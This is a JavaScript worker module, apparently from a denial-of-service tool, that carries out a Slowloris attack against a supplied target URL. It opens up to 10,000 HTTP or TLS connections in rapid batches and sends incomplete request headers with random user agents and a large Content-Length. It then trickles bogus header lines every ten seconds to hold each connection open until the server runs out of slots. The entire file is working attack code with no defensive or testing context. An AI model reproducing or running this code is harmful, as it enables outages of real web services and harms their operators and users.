import tls from "tls";
import net from "net";
import { parentPort, workerData } from "worker_threads";
import { randomString } from "../utils/randomUtils.js";

const MAX_SOCKETS = 10000;
const SOCKETS_PER_BATCH = 500;
const KEEP_ALIVE_INTERVAL = 10000;
const CONNECTION_DELAY = 10;

const startAttack = () => {
  const { target, userAgents, duration } = workerData;

  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;
  const isHttps = fixedTarget.startsWith("https");

  let targetHost = fixedTarget.replace(/^https?:\/\//, "").split("/")[0];
  let targetPort = isHttps ? 443 : 80;

  if (targetHost.includes(":")) {
    const [host, port] = targetHost.split(":");
    targetHost = host;
    targetPort = parseInt(port, 10);
  }

  console.log(`[SLOWLORIS] Target: ${targetHost}:${targetPort} (${isHttps ? "HTTPS" : "HTTP"})`);
  console.log(`[SLOWLORIS] Max: ${MAX_SOCKETS}, Batch: ${SOCKETS_PER_BATCH}, Delay: ${CONNECTION_DELAY}ms`);

  let totalPackets = 0;
  let successfulConnections = 0;
  let failedConnections = 0;
  const startTime = Date.now();
  const sockets = [];

  const createSlowlorisConnection = (userAgent) => {
    const socket = isHttps
      ? tls.connect({ host: targetHost, port: targetPort, servername: targetHost, rejectUnauthorized: false })
      : net.connect({ host: targetHost, port: targetPort });

    socket.setNoDelay(true);
    socket.setTimeout(30000);

    const removeSocket = () => {
      const idx = sockets.indexOf(socket);
      if (idx > -1) sockets.splice(idx, 1);
      if (!socket.destroyed) socket.destroy();
    };

    socket.once("timeout", removeSocket);
    socket.once("error", () => { failedConnections++; removeSocket(); });
    socket.once("close", removeSocket);
    socket.once("end", removeSocket);

    socket.once(isHttps ? "secureConnect" : "connect", () => {
      const headers =
        `GET /?${randomString(12)} HTTP/1.1\r\n` +
        `Host: ${targetHost}\r\n` +
        `User-Agent: ${userAgent}\r\n` +
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n` +
        `Accept-Language: en-US,en;q=0.5\r\n` +
        `Connection: keep-alive\r\n` +
        `Content-Length: 1000000\r\n`;

      socket.write(headers);
      totalPackets++;
      successfulConnections++;
      sockets.push(socket);
    });
  };

  const sendKeepAlive = () => {
    let alive = 0;
    for (const socket of sockets) {
      if (socket && !socket.destroyed) {
        try {
          socket.write(`X-a: ${randomString(3)}\r\n`);
          totalPackets++;
          alive++;
        } catch {}
      }
    }
    parentPort.postMessage({ log: `Keep-alive: ${alive} active connections`, totalPackets });
  };

  const connectionInterval = setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;

    if (elapsed >= duration) {
      clearInterval(connectionInterval);
      clearInterval(keepAliveTimer);
      sockets.forEach((s) => s && !s.destroyed && s.destroy());

      const rate = successfulConnections + failedConnections > 0
        ? ((successfulConnections / (successfulConnections + failedConnections)) * 100).toFixed(1)
        : "0";

      parentPort.postMessage({
        log: `Complete - Active: ${sockets.length}, Success: ${successfulConnections}, Failed: ${failedConnections}, Rate: ${rate}%`,
        totalPackets,
      });
      process.exit(0);
    }

    if (Math.floor(elapsed) % 3 === 0 && elapsed > 0) {
      parentPort.postMessage({
        log: `Active: ${sockets.length}/${MAX_SOCKETS} | Success: ${successfulConnections} | Failed: ${failedConnections}`,
        totalPackets,
      });
    }

    const toCreate = Math.min(SOCKETS_PER_BATCH, MAX_SOCKETS - sockets.length);
    for (let i = 0; i < toCreate; i++) {
      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
      createSlowlorisConnection(userAgent);
    }
  }, CONNECTION_DELAY);

  const keepAliveTimer = setInterval(sendKeepAlive, KEEP_ALIVE_INTERVAL);
};

if (workerData) {
  startAttack();
}
